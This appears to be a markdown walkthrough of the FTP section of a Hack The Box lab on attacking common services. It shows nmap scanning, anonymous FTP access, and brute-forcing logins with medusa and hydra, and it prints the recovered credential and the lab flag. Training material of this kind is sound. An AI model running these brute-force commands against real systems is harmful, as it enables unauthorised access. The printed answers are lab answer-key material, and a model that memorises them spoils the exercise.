# HTB-Attacking_Common_Services
## Table of Contents
1. [FTP](#ftp)

### FTP
#### Tools
1. medusa
2. hydra
#### Challenges
1. What port is the FTP service running on?

    We can solve this by using nmap to find ftp port.

    ```bash
    sudo nmap -sV -sC 10.129.55.8 -v
    ```
    ![alt text](Assets/FTP1.png)

    The answer is 2121.

2. What username is available for the FTP server?

    Based on the nmap output, the anonymous login is allowed. So i tried to ftp anonymously.

    ```bash
    ftp 10.129.55.8 2121
    ```
    In there, we can find users.list and passwords.list. After download using `get <file name>`, we can bruteforce by using medusa.
    
    ```bash
    medusa -U users.list -P passwords.list -h 10.129.55.8 -n 2121 -M ftp
    ```
    Another way for the faster result is using `hydra`.

    ```bash
    sudo hydra -L users.list -P passwords.list -t 32 -s 2121 ftp://10.129.55.8
    ```
    Then we will get `robin:7iz4rnckjsduza7` credential. The answer is `robin`.

3. Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.

    By using the credential that we found, we can get the flag. The answer is `HTB{ATT4CK1NG_F7P_53RV1C3}`.